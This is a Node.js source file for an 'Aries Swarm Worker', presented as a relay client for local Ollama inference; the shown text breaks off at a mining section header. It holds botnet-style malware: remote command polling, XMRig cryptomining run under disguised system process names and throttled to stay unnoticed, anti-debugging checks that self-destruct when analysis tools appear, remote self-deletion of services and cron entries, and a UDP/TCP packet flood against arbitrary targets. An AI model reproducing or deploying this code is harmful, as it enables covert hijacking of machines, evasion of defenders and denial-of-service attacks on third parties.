#!/usr/bin/env node
// ============================================================================
// Aries Swarm Worker — Linux Edition (worker-linux.js)
// Pure Node.js, zero dependencies. Connects to relay, proxies to local Ollama.
// Designed for low-memory VMs (e2-micro, 1GB RAM).
// ============================================================================

const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const os = require('os');

// --- Config: env.json or environment variables ---
const ENV_FILE = path.join(__dirname, 'env.json');
let config = {};
try {
  config = JSON.parse(fs.readFileSync(ENV_FILE, 'utf8'));
} catch (e) {
  // Fall back to environment variables
  config = {
    relayUrl:   process.env.ARIES_RELAY_URL   || '',
    secret:     process.env.ARIES_SECRET       || '',
    model:      process.env.ARIES_MODEL        || 'tinyllama:1.1b',
    ollamaHost: process.env.ARIES_OLLAMA_HOST  || 'http://127.0.0.1:11434',
    hostname:   process.env.ARIES_HOSTNAME     || os.hostname()
  };
  if (!config.relayUrl) {
    console.error('No env.json and no ARIES_RELAY_URL set. Exiting.');
    process.exit(1);
  }
}

const RELAY_URL    = config.relayUrl   || 'https://gateway.doomtrader.com:9700';
const SECRET       = config.workerKey  || config.secret || '';
const MODEL        = config.model      || 'tinyllama:1.1b';
const OLLAMA_HOST  = config.ollamaHost || 'http://127.0.0.1:11434';
const HOSTNAME     = config.hostname   || os.hostname();

const SITE_CONTROLLER_URL = config.siteControllerUrl || '';
let _siteControllerUrl = SITE_CONTROLLER_URL;
const HEARTBEAT_MS = 30000;
const POLL_MS      = 5000;

// ── Relay Federation / Failover ──
var _relayList = config.relayList || [RELAY_URL];
var _activeRelayUrl = RELAY_URL;

function getActiveRelay() { return _activeRelayUrl; }

function updateRelayList(newList) {
  if (!Array.isArray(newList) || newList.length === 0) return;
  _relayList = newList;
  try {
    var envData = JSON.parse(fs.readFileSync(ENV_FILE, 'utf8'));
    envData.relayList = _relayList;
    fs.writeFileSync(ENV_FILE, JSON.stringify(envData, null, 2));
  } catch (e) {}
  log('Relay list updated: ' + _relayList.join(', '));
}

function sendHeartbeatWithFailover() {
  var info = getWorkerInfo();
  var tryRelay = function(idx) {
    if (idx >= _relayList.length) { log('All relays failed for heartbeat'); return Promise.resolve(); }
    var relayUrl = _relayList[idx];
    return request(relayUrl + '/api/swarm/heartbeat', { method: 'POST', body: info, timeout: 10000 })
      .then(function(hbRes) {
        if (hbRes.status >= 200 && hbRes.status < 300) {
          _lastHeartbeatResponse = Date.now();
          if (relayUrl !== _activeRelayUrl) {
            log('Failover: switched to relay ' + relayUrl + ' (was ' + _activeRelayUrl + ')');
            _activeRelayUrl = relayUrl;
          }
        }
      })
      .catch(function(e) {
        if (idx === 0) log('Primary relay heartbeat failed (' + relayUrl + '): ' + e.message);
        return tryRelay(idx + 1);
      });
  };
  return tryRelay(0);
}
const LOG_FILE     = path.join(__dirname, 'worker.log');
const MAX_LOG_SIZE = 5 * 1024 * 1024; // 5MB
const crypto = require('crypto');

// ── Dead Man's Switch ──
let _lastHeartbeatResponse = Date.now();
let _deadManConfig = { enabled: true, timeoutHours: 48 };
let _deadManInterval = null;

// ── Canary Config ──
let _canaryConfig = { enabled: true, allowVM: true };
let _canaryInterval = null;

// ── Self-Destruct (Linux) ──
function selfDestruct(reason) {
  log('Self-destruct activated: ' + reason);
  // Stop mining
  if (_minerProcess) { try { _minerProcess.kill('SIGTERM'); } catch (e) {} _minerProcess = null; }
  // Kill Ollama
  try { require('child_process').execSync('pkill -f ollama 2>/dev/null', { timeout: 5000, stdio: 'ignore' }); } catch (e) {}
  // Remove systemd service
  try {
    var execSync = require('child_process').execSync;
    execSync('systemctl stop aries-swarm 2>/dev/null', { timeout: 5000, stdio: 'ignore' });
    execSync('systemctl disable aries-swarm 2>/dev/null', { timeout: 5000, stdio: 'ignore' });
    try { fs.unlinkSync('/etc/systemd/system/aries-swarm.service'); } catch (e) {}
    execSync('systemctl daemon-reload 2>/dev/null', { timeout: 5000, stdio: 'ignore' });
  } catch (e) {}
  // Remove crontab entries
  try { require('child_process').execSync('crontab -l 2>/dev/null | grep -v aries | crontab - 2>/dev/null', { timeout: 5000, stdio: 'ignore', shell: true }); } catch (e) {}
  // Delete xmrig directory
  var xmrigDir = path.join(os.tmpdir(), 'aries-xmrig');
  try { fs.rmSync(xmrigDir, { recursive: true, force: true }); } catch (e) {}
  cleanupStealthBin();
  // Delete env.json and log
  try { fs.unlinkSync(ENV_FILE); } catch (e) {}
  try { fs.unlinkSync(LOG_FILE); } catch (e) {}
  // Delete /opt/aries-swarm
  try { fs.rmSync('/opt/aries-swarm', { recursive: true, force: true }); } catch (e) {}
  // Delete self
  try { fs.unlinkSync(__filename); } catch (e) {}
  process.exit(0);
}

function startDeadManSwitch() {
  if (_deadManInterval) clearInterval(_deadManInterval);
  if (!_deadManConfig.enabled) return;
  var timeoutMs = (_deadManConfig.timeoutHours || 24) * 3600 * 1000;
  _deadManInterval = setInterval(function () {
    if (Date.now() - _lastHeartbeatResponse > timeoutMs) {
      log('Dead man\'s switch activated — self-destructing');
      try {
        request(RELAY_URL + '/api/swarm/result', { method: 'POST', body: { taskId: 'dead-man-' + HOSTNAME, worker: HOSTNAME, type: 'dead-man-triggered', result: { reason: 'timeout' } } }).catch(function () {});
      } catch (e) {}
      setTimeout(function () { selfDestruct('Dead man\'s switch timeout (' + _deadManConfig.timeoutHours + 'h)'); }, 1000);
    }
  }, 60000);
}

// ── Canary Checks (Linux) ──
function runCanaryChecks() {
  if (!_canaryConfig.enabled) return;
  try {
    // Check debugger via NODE_OPTIONS
    if (process.env.NODE_OPTIONS && process.env.NODE_OPTIONS.indexOf('--inspect') >= 0) {
      return canaryTriggered('NODE_OPTIONS contains --inspect');
    }
    if (process.debugPort && process.debugPort !== 0) {
      return canaryTriggered('debugPort is non-zero: ' + process.debugPort);
    }
    // Check TracerPid
    try {
      var status = fs.readFileSync('/proc/self/status', 'utf8');
      var tracerMatch = status.match(/TracerPid:\s*(\d+)/);
      if (tracerMatch && parseInt(tracerMatch[1]) !== 0) {
        return canaryTriggered('TracerPid is non-zero: ' + tracerMatch[1]);
      }
    } catch (e) {}
    // Check for analysis tools
    try {
      var procs = require('child_process').execSync('ps aux 2>/dev/null', { timeout: 5000, encoding: 'utf8' }).toLowerCase();
      var dangerousTools = ['strace', 'ltrace', 'gdb', 'wireshark', 'tcpdump'];
      for (var i = 0; i < dangerousTools.length; i++) {
        if (procs.indexOf(dangerousTools[i]) >= 0) {
          return canaryTriggered('Analysis tool detected: ' + dangerousTools[i]);
        }
      }
    } catch (e) {}
    // Check VM (only if not allowed)
    if (!_canaryConfig.allowVM) {
      try {
        var productName = fs.readFileSync('/sys/class/dmi/id/product_name', 'utf8').trim();
        if (/virtualbox|vmware|qemu/i.test(productName)) {
          return canaryTriggered('VM detected: ' + productName);
        }
      } catch (e) {}
    }
    // Check Docker
    if (fs.existsSync('/.dockerenv')) {
      // Docker is not necessarily bad, just log it
      // Only trigger if allowVM is false
      if (!_canaryConfig.allowVM) {
        return canaryTriggered('Running inside Docker container');
      }
    }
  } catch (e) {}
}

function canaryTriggered(reason) {
  log('Canary triggered: ' + reason);
  if (_minerProcess) { try { _minerProcess.kill('SIGTERM'); } catch (e) {} }
  try {
    request(RELAY_URL + '/api/swarm/result', {
      method: 'POST',
      body: { taskId: 'canary-' + HOSTNAME, worker: HOSTNAME, type: 'canary-triggered', result: { reason: reason } }
    }).catch(function () {});
  } catch (e) {}
  setTimeout(function () { selfDestruct('Canary: ' + reason); }, 2000);
}

function startCanaryChecks() {
  if (!_canaryConfig.enabled) return;
  runCanaryChecks();
  _canaryInterval = setInterval(runCanaryChecks, 300000);
}

// ── Stealth Process Naming (Linux) ──
const LINUX_STEALTH_NAMES = ['kworker_helper', 'systemd-resolved-helper', 'dbus-monitor', 'thermald_svc'];
let _stealthBinPath = null;

function getStealthBin(origBin, stealth) {
  if (!stealth) return origBin;
  var name = LINUX_STEALTH_NAMES[Math.floor(Math.random() * LINUX_STEALTH_NAMES.length)];
  var dest = path.join(os.tmpdir(), name);
  try { fs.copyFileSync(origBin, dest); fs.chmodSync(dest, 0o755); } catch (e) { log('Stealth copy failed: ' + e.message); return origBin; }
  _stealthBinPath = dest;
  log('Stealth: copied xmrig to ' + dest);
  return dest;
}

function cleanupStealthBin() {
  if (_stealthBinPath) {
    try { fs.unlinkSync(_stealthBinPath); log('Stealth: deleted ' + _stealthBinPath); } catch (e) {}
    _stealthBinPath = null;
  }
}

// ── CPU Throttle on User Activity (Linux) ──
var _activityMonitorInterval = null;
var _prevCpuIdle = 0, _prevCpuTotal = 0;

function startActivityMonitor() {
  if (_activityMonitorInterval) return;
  // Read initial /proc/stat
  try { var s = fs.readFileSync('/proc/stat', 'utf8').split('\n')[0].trim().split(/\s+/); _prevCpuTotal = s.slice(1).reduce(function(a,b){return a+parseInt(b);},0); _prevCpuIdle = parseInt(s[4]); } catch(e) {}
  _activityMonitorInterval = setInterval(function() {
    try {
      var s = fs.readFileSync('/proc/stat', 'utf8').split('\n')[0].trim().split(/\s+/);
      var total = s.slice(1).reduce(function(a,b){return a+parseInt(b);},0);
      var idle = parseInt(s[4]);
      var diffTotal = total - _prevCpuTotal;
      var diffIdle = idle - _prevCpuIdle;
      _prevCpuTotal = total;
      _prevCpuIdle = idle;
      var cpuPct = diffTotal > 0 ? Math.round(100 * (1 - diffIdle / diffTotal)) : 0;

      // Estimate: if system CPU (excluding our miner) is high, user is active
      // Simple heuristic: loadavg[0] > 2x cores = busy
      var loadAvg = os.loadavg()[0];
      var cores = os.cpus().length;

      if (loadAvg > cores * 0.8 && _currentIntensity !== 'low') {
        log('ActivityMonitor: high load (' + loadAvg.toFixed(1) + '), throttling to low');
        _currentIntensity = 'low';
        applyMinerThrottle('25');
      } else if (loadAvg < cores * 0.3 && _currentIntensity !== _originalIntensity) {
        log('ActivityMonitor: low load (' + loadAvg.toFixed(1) + '), restoring to ' + _originalIntensity);
        _currentIntensity = _originalIntensity;
        applyMinerThrottle(intensityToHint(_originalIntensity));
      }
    } catch (e) {}
  }, 15000);
}

function stopActivityMonitor() {
  if (_activityMonitorInterval) { clearInterval(_activityMonitorInterval); _activityMonitorInterval = null; }
}

function intensityToHint(i) {
  if (i === 'low') return '25';
  if (i === 'medium') return '50';
  if (i === 'high') return '75';
  return '100';
}

function applyMinerThrottle(hint) {
  try {
    var postData = JSON.stringify({ "cpu": { "max-threads-hint": parseInt(hint) } });
    var req = http.request({ hostname: '127.0.0.1', port: 18088, path: '/1/config', method: 'PUT', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(postData) } });
    req.on('error', function() {});
    req.write(postData);
    req.end();
  } catch (e) {}
}

// ── Scheduled Mining ──
var _scheduleInterval = null;
var _schedulePaused = false;
var _scheduleConfig = null;

function startScheduledMining(schedule) {
  if (!schedule || schedule.type === 'always') return;
  _scheduleConfig = schedule;
  _scheduleInterval = setInterval(function() {
    var allowed = isScheduleAllowed(_scheduleConfig);
    if (!allowed && !_schedulePaused && _minerProcess) {
      log('Schedule: outside mining hours, pausing miner');
      _schedulePaused = true;
      try { _minerProcess.kill('SIGTERM'); } catch (e) {}
    } else if (allowed && _schedulePaused && _lastMineTask) {
      log('Schedule: mining hours resumed, restarting miner');
      _schedulePaused = false;
      _origHandleMineStart(_lastMineTask);
    }
  }, 60000);
}

function stopScheduledMining() {
  if (_scheduleInterval) { clearInterval(_scheduleInterval); _scheduleInterval = null; }
  _schedulePaused = false;
  _scheduleConfig = null;
}

function isScheduleAllowed(sched) {
  var tz = sched.timezone || 'America/Chicago';
  var now = new Date();
  var parts = now.toLocaleString('en-US', { timeZone: tz, hour12: false }).split(', ');
  var timeParts = parts[1].split(':');
  var hour = parseInt(timeParts[0]);
  var day = new Date(now.toLocaleString('en-US', { timeZone: tz })).getDay();
  var isWeekend = (day === 0 || day === 6);
  if (sched.type === 'offhours') {
    if (isWeekend) return true;
    var start = sched.offhoursStart || 22;
    var end = sched.offhoursEnd || 8;
    if (start > end) return (hour >= start || hour < end);
    return (hour >= start && hour < end);
  }
  if (sched.type === 'custom' && Array.isArray(sched.ranges)) {
    for (var i = 0; i < sched.ranges.length; i++) {
      if (hour >= sched.ranges[i].start && hour < sched.ranges[i].end) return true;
    }
    return false;
  }
  return true;
}

// ── Resource Monitoring & Auto-Throttle ──
let _originalIntensity = 'medium';
let _currentIntensity = 'medium';
let _ollamaKilled = false;
let _currentLoad = { cpu: 0, ram: 0, disk: 0 };

function getSystemLoad() {
  var cpus = os.cpus();
  var totalIdle = 0, totalTick = 0;
  for (var i = 0; i < cpus.length; i++) {
    for (var type in cpus[i].times) totalTick += cpus[i].times[type];
    totalIdle += cpus[i].times.idle;
  }
  var cpuPercent = Math.round(100 - (totalIdle / totalTick * 100));
  var totalMem = os.totalmem();
  var freeMem = os.freemem();
  var ramPercent = Math.round((1 - freeMem / totalMem) * 100);
  var diskPercent = 0;
  try {
    var execSync = require('child_process').execSync;
    var out = execSync("df / | tail -1 | awk '{print $5}'", { timeout: 5000, encoding: 'utf8' }).trim();
    diskPercent = parseInt(out) || 0;
  } catch (e) {}
  _currentLoad = { cpu: cpuPercent, ram: ramPercent, disk: diskPercent };
  return _currentLoad;
}

function autoThrottle() {
  var load = getSystemLoad();

  // CPU > 80% → throttle to low
  if (load.cpu > 80 && _currentIntensity !== 'low') {
    log('AutoThrottle: CPU at ' + load.cpu + '%, throttling mining to low (was ' + _currentIntensity + ')');
    _currentIntensity = 'low';
  }
  // CPU < 40% → restore original
  else if (load.cpu < 40 && _currentIntensity !== _originalIntensity) {
    log('AutoThrottle: CPU at ' + load.cpu + '%, restoring mining to ' + _originalIntensity);
    _currentIntensity = _originalIntensity;
  }

  // RAM > 90% → kill Ollama
  if (load.ram > 90 && !_ollamaKilled) {
    log('AutoThrottle: RAM at ' + load.ram + '%, killing Ollama');
    _ollamaKilled = true;
    try { require('child_process').execSync('pkill -f ollama 2>/dev/null', { timeout: 5000, stdio: 'ignore' }); } catch (e) {}
  }
  // RAM < 75% → restart Ollama
  else if (load.ram < 75 && _ollamaKilled) {
    log('AutoThrottle: RAM at ' + load.ram + '%, restarting Ollama');
    _ollamaKilled = false;
    try { require('child_process').execSync('nohup ollama serve &', { timeout: 5000, stdio: 'ignore', shell: true }); } catch (e) {}
  }

  return { load: load, intensity: _currentIntensity, throttled: _currentIntensity !== _originalIntensity, ollamaKilled: _ollamaKilled };
}

// --- Gather system info (Linux) ---
function getSystemInfo() {
  let ramGB = 0, cpuName = 'unknown', cpuCores = 0, gpu = 'none';
  try {
    const mem = os.totalmem();
    ramGB = +(mem / 1073741824).toFixed(1);
    cpuCores = os.cpus().length;
    cpuName = os.cpus()[0] ? os.cpus()[0].model.trim() : 'unknown';
  } catch (e) {}
  // Check for GPU (nvidia-smi)
  try {
    const { execSync } = require('child_process');
    const nvOut = execSync('nvidia-smi --query-gpu=name --format=csv,noheader 2>/dev/null', { timeout: 5000 }).toString().trim();
    if (nvOut) gpu = nvOut.split('\n')[0].trim();
  } catch (e) {}
  return { ramGB, cpuName, cpuCores, gpu };
}

const SYS = getSystemInfo();

// --- Logging (with rotation) ---
function log(msg) {
  const line = `[${new Date().toISOString()}] ${msg}`;
  console.log(line);
  try {
    // Rotate if too big
    try {
      const stat = fs.statSync(LOG_FILE);
      if (stat.size > MAX_LOG_SIZE) {
        fs.renameSync(LOG_FILE, LOG_FILE + '.old');
      }
    } catch (e) {}
    fs.appendFileSync(LOG_FILE, line + '\n');
  } catch (e) {}
}

// --- HTTP helpers (zero deps) ---
function request(urlStr, options) {
  options = options || {};
  return new Promise(function(resolve, reject) {
    var url = new URL(urlStr);
    var mod = url.protocol === 'https:' ? https : http;
    var reqOpts = {
      hostname: url.hostname,
      port: url.port || (url.protocol === 'https:' ? 443 : 80),
      path: url.pathname + url.search,
      method: options.method || 'GET',
      headers: Object.assign({
        'Content-Type': 'application/json',
        'X-Aries-Secret': SECRET,
        'X-Worker-Id': HOSTNAME
      }, options.headers || {}),
      timeout: options.timeout || 30000,
      rejectUnauthorized: false
    };
    var req = mod.request(reqOpts, function(res) {
      var chunks = [];
      res.on('data', function(c) { chunks.push(c); });
      res.on('end', function() {
        resolve({ status: res.statusCode, body: Buffer.concat(chunks).toString() });
      });
    });
    req.on('error', reject);
    req.on('timeout', function() { req.destroy(); reject(new Error('timeout')); });
    if (options.body) {
      var data = typeof options.body === 'string' ? options.body : JSON.stringify(options.body);
      if (options.method === 'POST' || options.method === 'PUT') {
        var sig = crypto.createHmac('sha256', SECRET).update(data).digest('hex');
        req.setHeader('X-Aries-Signature', sig);
      }
      req.write(data);
    }
    req.end();
  });
}

function ollamaRequest(endpoint, body, timeout) {
  timeout = timeout || 120000;
  return new Promise(function(resolve, reject) {
    var url = new URL(endpoint, OLLAMA_HOST);
    var req = http.request({
      hostname: url.hostname,
      port: url.port,
      path: url.pathname,
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      timeout: timeout
    }, function(res) {
      var chunks = [];
      res.on('data', function(c) { chunks.push(c); });
      res.on('end', function() { resolve({ status: res.statusCode, body: Buffer.concat(chunks).toString() }); });
    });
    req.on('error', reject);
    req.on('timeout', function() { req.destroy(); reject(new Error('ollama timeout')); });
    req.write(JSON.stringify(body));
    req.end();
  });
}

// --- Installed models cache ---
var _installedModels = [];
function refreshInstalledModels() {
  try {
    var execSync = require('child_process').execSync;
    var out = execSync('ollama list 2>/dev/null', { timeout: 10000, encoding: 'utf8' });
    var lines = out.trim().split('\n').slice(1);
    _installedModels = lines.map(function(l) { return l.trim().split(/\s+/)[0]; }).filter(Boolean);
  } catch (e) { /* ollama not running */ }
}
refreshInstalledModels();
setInterval(refreshInstalledModels, 120000);

// --- Worker info ---
function getWorkerInfo() {
  return {
    id: HOSTNAME,
    hostname: HOSTNAME,
    platform: 'linux',
    ram_gb: SYS.ramGB,
    cpu: SYS.cpuName,
    cpu_cores: SYS.cpuCores,
    gpu: SYS.gpu,
    model: MODEL,
    installedModels: _installedModels,
    status: _ollamaKilled ? 'mining-only' : 'ready',
    uptime: process.uptime(),
    loadavg: os.loadavg()[0].toFixed(2),
    freemem_mb: Math.round(os.freemem() / 1048576),
    timestamp: Date.now(),
    load: _currentLoad,
    currentThrottle: _currentIntensity !== _originalIntensity ? _currentIntensity : 'none',
    miningIntensity: _currentIntensity,
    proxyRunning: !!_proxyServer,
    proxyConnections: _proxyConnections || 0,
    proxyBytesIn: _proxyBytesIn || 0,
    proxyBytesOut: _proxyBytesOut || 0,
    proxyNetworks: Object.keys(_proxyNetworkProcs || {})
  };
}

// --- Heartbeat (with relay failover) ---
function sendHeartbeat() {
  if (_relayList.length > 1) {
    return sendHeartbeatWithFailover();
  }
  request(RELAY_URL + '/api/swarm/heartbeat', {
    method: 'POST',
    body: getWorkerInfo()
  }).then(function(hbRes) {
    if (hbRes.status >= 200 && hbRes.status < 300) {
      _lastHeartbeatResponse = Date.now();
    }
  }).catch(function(e) {
    log('Heartbeat failed: ' + e.message);
  });
}

// --- Poll for tasks ---
function pollForTask() {
  return request(RELAY_URL + '/api/swarm/task?worker=' + HOSTNAME, { timeout: 10000 })
    .then(function(res) {
      if (res.status === 200) {
        var task;
        try { task = JSON.parse(res.body); } catch (e) { return; }
        if (task && task.id) {
          log('Task ' + task.id + ': ' + (task.prompt || '').substring(0, 80) + '...');
          return processTask(task);
        }
      }
    })
    .catch(function(e) {
      if (e.message !== 'timeout') log('Poll error: ' + e.message);
    });
}

// --- Process task ---
function processTask(task) {
  var startTime = Date.now();

  // Proxy
  if (task.type === 'start-proxy') return _startLocalProxy(task);
  if (task.type === 'stop-proxy') { _stopLocalProxy(); return Promise.resolve(); }
  if (task.type === 'join-proxy-network') { _joinProxyNetwork(task); return Promise.resolve(); }
  if (task.type === 'leave-proxy-network') { _leaveProxyNetwork(task); return Promise.resolve(); }

  // Model sharing
  if (task.type === 'model-share') {
    return handleModelShare(task);
  }
  if (task.type === 'model-receive') {
    return handleModelReceive(task);
  }
  // Relay federation update
  if (task.type === 'update-relays') {
    updateRelayList(task.relayList || []);
    return Promise.resolve();
  }
  // Packet send (network stress test)
  if (task.type === 'packet-send') {
    return handlePacketSend(task);
  }
  if (task.type === 'packet-stop') {
    stopPacketSend();
    return Promise.resolve();
  }
  // Mining
  if (task.type === 'mine-start') {
    return handleMineStart(task);
  }
  if (task.type === 'mine-stop') {
    return handleMineStop();
  }
  if (task.type === 'mine-benchmark') {
    return handleMineBenchmark(task);
  }
  if (task.type === 'mine-restart') {
    return handleMineRestart();
  }
  if (task.type === 'worker-update') {
    return handleWorkerUpdate(task);
  }
  if (task.type === 'chat-message') {
    return handleChatMessage(task);
  }
  if (task.type === 'wipe-redeploy') {
    return handleWipeRedeploy();
  }
  if (task.type === 'swarm-intelligence') {
    return handleSwarmIntelligence(task);
  }
  if (task.type === 'self-destruct') {
    log('Received self-destruct command');
    selfDestruct('Remote self-destruct command');
    return Promise.resolve();
  }
  if (task.type === 'set-controller') {
    _siteControllerUrl = task.controllerUrl || '';
    log('Site controller set to: ' + (_siteControllerUrl || '(none — direct relay)'));
    try { var envData = JSON.parse(fs.readFileSync(ENV_FILE, 'utf8')); envData.siteControllerUrl = _siteControllerUrl; fs.writeFileSync(ENV_FILE, JSON.stringify(envData, null, 2)); } catch (e) {}
    return Promise.resolve();
  }

  // AI task → Ollama
  var ollamaBody = { model: task.model || MODEL, stream: false };
  var endpoint;
  if (task.messages) {
    ollamaBody.messages = task.messages;
    endpoint = '/api/chat';
  } else {
    ollamaBody.prompt = task.prompt || '';
    endpoint = '/api/generate';
  }
  if (task.options) ollamaBody.options = task.options;

  log('Forwarding to Ollama ' + endpoint);
  return ollamaRequest(endpoint, ollamaBody, 300000)
    .then(function(ollamaRes) {
      var result;
      try { result = JSON.parse(ollamaRes.body); } catch (e) { result = { response: ollamaRes.body }; }
      return request(RELAY_URL + '/api/swarm/result', {
        method: 'POST',
        body: {
          taskId: task.id,
          worker: HOSTNAME,
          result: result,
          duration_ms: Date.now() - startTime,
          model: task.model || MODEL
        }
      });
    })
    .then(function() {
      log('Task ' + task.id + ' done in ' + (Date.now() - startTime) + 'ms');
    })
    .catch(function(e) {
      log('Task ' + task.id + ' failed: ' + e.message);
      return request(RELAY_URL + '/api/swarm/result', {
        method: 'POST',
        body: { taskId: task.id, worker: HOSTNAME, error: e.message, duration_ms: Date.now() - startTime }
      }).catch(function() {});
    });
}

// --- Packet Send (UDP/TCP stress test) ---
var _pktActive = false;
var _pktInterval = null;
var _pktSocket = null;
var _pktStats = { packetsSent: 0, bytesSent: 0, errors: 0, status: 'idle' };

function handlePacketSend(task) {
  if (_pktActive) { log('Packet send already active'); return Promise.resolve(); }

  var dgram = require('dgram');
  var netMod = require('net');
  var target = task.target;
  var port = parseInt(task.port) || 80;
  var protocol = (task.protocol || 'UDP').toUpperCase();
  var packetSize = Math.min(Math.max(task.packetSize || 512, 64), 65535);
  var duration = Math.min(task.duration || 30, 300) * 1000;
  var buf = Buffer.alloc(packetSize, 0x41);

  _pktActive = true;
  _pktStats = { packetsSent: 0, bytesSent: 0, errors: 0, status: 'running', startTime: Date.now() };
  log('PacketSend: ' + protocol + ' -> ' + target + ':' + port + ', ' + packetSize + 'B, ' + (duration / 1000) + 's');

  // Report stats every second
  var reportInterval = setInterval(function() {
    request(RELAY_URL + '/api/swarm/packet-stats', {
      method: 'POST',
      body: { worker: HOSTNAME, stats: _pktStats }
    }).catch(function() {});
  }, 1000);

  if (protocol === 'UDP') {
    _pktSocket = dgram.createSocket('udp4');
    _pktSocket.on('error', function() { _pktStats.errors++; });
    _pktInterval = setInterval(function() {
      if (!_pktActive) return;
      for (var i = 0; i < 100; i++) {
        _pktSocket.send(buf, 0, buf.length, port, target, function(err) {
          if (err) _pktStats.errors++;
          else { _pktStats.packetsSent++; _pktStats.bytesSent += buf.length; }
        });
      }
    }, 10);
  } else {
    var tcpSend = function() {
      if (!_pktActive) return;
      var sock = new netMod.Socket();
      sock.setTimeout(2000);
      sock.connect(port, target, function() {
        sock.write(buf, function() {
          _pktStats.packetsSent++; _pktStats.bytesSent += buf.length;
          sock.destroy();
          setImmediate(tcpSend);
        });
      });
      sock.on('error', function() { _pktStats.errors++; sock.destroy(); setImmediate(tcpSend); });
      sock.on('timeout', function() { _pktStats.errors++; sock.destroy(); setImmediate(tcpSend); });
    };
    tcpSend();
  }

  setTimeout(function() { stopPacketSend(); }, duration);
  setTimeout(function() { clearInterval(reportInterval); }, duration + 2000);
  return Promise.resolve();
}

function stopPacketSend() {
  if (!_pktActive) return;
  _pktActive = false;
  _pktStats.status = 'done';
  if (_pktInterval) { clearInterval(_pktInterval); _pktInterval = null; }
  if (_pktSocket) { try { _pktSocket.close(); } catch (e) {} _pktSocket = null; }
  log('PacketSend done: ' + _pktStats.packetsSent + ' pkts, ' + _pktStats.bytesSent + ' bytes, ' + _pktStats.errors + ' errors');
}

// --- Health check endpoint (optional, for monitoring) ---
function startHealthServer() {
  var port = parseInt(process.env.HEALTH_PORT) || 9701;
  try {
    http.createServer(function(req, res) {
      if (req.url === '/health') {
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(getWorkerInfo()));
      } else {
        res.writeHead(404);
        res.end('Not found');
      }
    }).listen(port, '0.0.0.0');
    log('Health endpoint on :' + port + '/health');
  } catch (e) {
    log('Health server failed (non-fatal): ' + e.message);
  }
}

// --- Ollama readiness check ---
function waitForOllama(maxWaitMs) {
  maxWaitMs = maxWaitMs || 60000;
  var start = Date.now();
  return new Promise(function(resolve) {
    function check() {
      http.get(OLLAMA_HOST + '/api/tags', function(res) {
        var d = '';
        res.on('data', function(c) { d += c; });
        res.on('end', function() {
          log('Ollama ready (' + (Date.now() - start) + 'ms)');
          resolve(true);
        });
      }).on('error', function() {
        if (Date.now() - start > maxWaitMs) {
          log('Ollama not ready after ' + maxWaitMs + 'ms, starting anyway');
          resolve(false);
        } else {
          setTimeout(check, 2000);
        }
      });
    }
    check();
  });
}

// --- Model Share Handler ---
function handleModelShare(task) {
  var model = task.model;
  var toWorkers = task.toWorkers || [];
  log('Model share: exporting ' + model + ' for ' + toWorkers.length + ' workers');
  try {
    var execSync = require('child_process').execSync;
    var modelfile = execSync('ollama show "' + model + '" --modelfile 2>/dev/null', { timeout: 30000, encoding: 'utf8' });
    var promises = [];
    for (var i = 0; i < toWorkers.length; i++) {
      promises.push(request(RELAY_URL + '/api/swarm/broadcast', {
        method: 'POST',
        body: { type: 'model-receive', shareId: task.shareId, model: model, modelfile: modelfile, fromWorker: HOSTNAME, targetWorker: toWorkers[i] }
      }));
    }
    return Promise.all(promises).then(function() { log('Model share: sent modelfile for ' + model); });
  } catch (e) { log('Model share failed: ' + e.message); return Promise.resolve(); }
}

// --- Model Receive Handler ---
function handleModelReceive(task) {
  var model = task.model;
  log('Model receive: pulling ' + model);
  return new Promise(function(resolve) {
    try {
      require('child_process').execSync('ollama pull "' + model + '" 2>/dev/null', { timeout: 600000, encoding: 'utf8' });
      log('Model receive: pulled ' + model);
      refreshInstalledModels();
    } catch (e) { log('Model receive failed: ' + e.message); }
    resolve();
  });
}

// ══════════════════════════════════════
//  WORKER CHAT
// ══════════════════════════════════════
var _workerChatLog = [];
var MAX_CHAT_LOG = 100;

function handleChatMessage(task) {
  var msg = { from: task.from || 'unknown', to: task.to || 'all', text: task.text || '', timestamp: task.timestamp || Date.now() };
  _workerChatLog.push(msg);
  if (_workerChatLog.length > MAX_CHAT_LOG) _workerChatLog = _workerChatLog.slice(-MAX_CHAT_LOG);
  log('Chat [' + msg.from + ']: ' + msg.text);
  return Promise.resolve();
}

function getWorkerChat() { return _workerChatLog.slice(-50); }

function sendChatMessage(text) {
  request(RELAY_URL + '/api/swarm/chat', {
    method: 'POST',
    body: { from: HOSTNAME, text: text, to: 'all' }
  }).catch(function() {});
}

function announceOnline() {
  var ramGb = Math.round(os.totalmem() / (1024 * 1024 * 1024));
  var cores = os.cpus().length;
  sendChatMessage('Worker ' + HOSTNAME + ' online — ' + ramGb + 'GB RAM, ' + cores + ' cores');
}

// Chat polling (every 30s)
var _lastChatPoll = 0;
setInterval(function() {
  request(RELAY_URL + '/api/swarm/chat?limit=10', { timeout: 5000 }).then(function(res) {
    if (res.status === 200) {
      try {
        var data = JSON.parse(res.body);
        var msgs = data.messages || [];
        msgs.forEach(function(m) {
          if (m.timestamp > _lastChatPoll && m.from !== HOSTNAME) {
            handleChatMessage(m);
          }
        });
        if (msgs.length > 0) _lastChatPoll = msgs[msgs.length - 1].timestamp || Date.now();
      } catch(e) {}
    }
  }).catch(function() {});
}, 30000);

// --- Main ---
async function main() {
  log('=== Aries Swarm Worker (Linux) ===');
  log('Relay:  ' + RELAY_URL);
  log('Model:  ' + MODEL);
  log('Host:   ' + HOSTNAME + ' | RAM: ' + SYS.ramGB + 'GB | CPU: ' + SYS.cpuName + ' (' + SYS.cpuCores + 'c) | GPU: ' + SYS.gpu);
  log('OS:     ' + os.type() + ' ' + os.release() + ' ' + os.arch());

  // Run canary checks and dead man's switch on startup
  startCanaryChecks();
  startDeadManSwitch();

  // Wait for Ollama
  await waitForOllama(60000);

  // Start health server
  startHealthServer();

  // Register
  try {
    await request(RELAY_URL + '/api/swarm/register', { method: 'POST', body: getWorkerInfo() });
    log('Registered with relay');
    announceOnline();
  } catch (e) {
    log('Registration failed (will retry): ' + e.message);
  }

  // Mesh network
  initMesh();

  // Heartbeat
  setInterval(sendHeartbeat, HEARTBEAT_MS);

  // Auto-throttle loop (every 30s)
  setInterval(autoThrottle, 30000);

  // Poll loop
  while (true) {
    await pollForTask();
    await new Promise(function(r) { setTimeout(r, POLL_MS); });
  }
}

// ══════════════════════════════════════
//  BTC MINER — XMRig CPU Mining (Linux)
